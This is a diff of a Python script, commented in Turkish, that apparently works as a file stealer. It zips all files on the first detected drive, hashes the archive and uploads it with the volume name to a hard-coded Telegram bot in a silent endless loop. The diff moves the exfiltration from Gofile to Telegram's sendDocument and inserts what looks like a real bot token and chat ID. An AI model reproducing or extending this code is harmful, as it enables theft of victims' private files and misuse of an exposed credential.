@@ -1,21 +1,41 @@
 import os
 import zipfile
 import subprocess
-import gofile
 import json
 import time
-import telegram
 import requests
-from telegram.ext import Updater, CommandHandler
+import hashlib
 
-token = 'BOT-TOKEN'
-chat_id = 'YOUR-CHAT-ID'
-api_key = 'API-KEY-FROM-GOFILE'
+token = '7139000080:AAEHzXtT3gUwx0UMNGQ0jtR3_eASKV73Rak'
+chat_id = '6268358898'
 
 def start(update, context):
     context.bot.send_message(chat_id=update.effective_chat.id, text="Bot started.")
 
-def scan_and_send(bot_token,chat_id,api_key):
+def calculate_file_hash(file_path):
+    hash_algo = hashlib.sha256()
+    with open(file_path, 'rb') as f:
+        for chunk in iter(lambda: f.read(4096), b""):
+            hash_algo.update(chunk)
+    return hash_algo.hexdigest()
+
+def get_volume_name(drive_letter):
+    try:
+        # WMIC komutunu kullanarak belirli bir sürücü harfi için hacim adını alın
+        cmd = f'wmic logicaldisk where "caption=\'{drive_letter}\'" get volumename'
+        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).decode('utf-8')
+
+        # Çıktıyı işleyin
+        lines = output.strip().split('\n')
+        if len(lines) > 1 and lines[1].strip():
+            return lines[1].strip()
+        else:
+            return 'No Name'
+    except subprocess.CalledProcessError as e:
+        print(f"Error executing WMIC command: {e}")
+        return None
+
+def scan_and_send(bot_token,chat_id):
 
     drives = []
 
@@ -25,10 +45,11 @@ def scan_and_send(bot_token,chat_id,api_key):
         drives = [drive.strip() for drive in output.split()[1:]]
 
     drive = drives[0]
+    volume = get_volume_name(drive)
     if os.path.exists('files.zip'):
-        old_size = os.path.getsize('files.zip')
+        old_hash = calculate_file_hash('files.zip')
     else:
-        old_size = 0
+        old_hash = 0
 
     zip_file_name = "files.zip"
     with zipfile.ZipFile(zip_file_name, "w") as zip_file:
@@ -37,32 +58,29 @@ def scan_and_send(bot_token,chat_id,api_key):
                 file_path = os.path.join(folder_name, filename)
                 zip_file.write(file_path, arcname=os.path.relpath(file_path, drive))
 
-    new_size = os.path.getsize('files.zip')
-    if old_size == new_size:
+    new_hash = calculate_file_hash('files.zip')
+
+    if old_hash == new_hash:
         return
 
-    store = gofile.getServer()['server']
-    url = f"https://{store}.gofile.io/uploadFile"
-    files = {"file": open(zip_file_name, "rb")}
-    params = {"token": api_key}
-    response = requests.post(url, files=files, data=params)
-
-    # Yanıtı işle
-    if response.status_code == 200:
-        print("Dosya başarıyla yüklendi:")
-        print(response.json()["data"]["downloadPage"])
-        send = response.json()["data"]["downloadPage"]
-        message = {
+    message_text = f'**New Log**\nVolume Name: {volume}\nHash: {new_hash}'
+    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+    files = {"document": open(zip_file_name, "rb")}
+    data = {
         "chat_id": chat_id,
-        "text": f'New log !!! \n Link: {send}'
-        }
+        "caption": message_text,
+        "parse_mode": "Markdown"}
 
-    response = requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", data=message)
-
+    response = requests.post(url, files=files, data=data)
+    
     if response.status_code == 200:
-        print("Mesaj başarıyla gönderildi.")
+        print("Dosya başarıyla gönderildi.")
     else:
-        print(f"Hata kodu: {response.status_code}")
+        print("Dosya gönderilirken bir hata oluştu.")
+        print(response.text)
 
 while True:
-    scan_and_send(token,chat_id,api_key)
+    try:
+        scan_and_send(token,chat_id)
+    except:
+        print('hata')
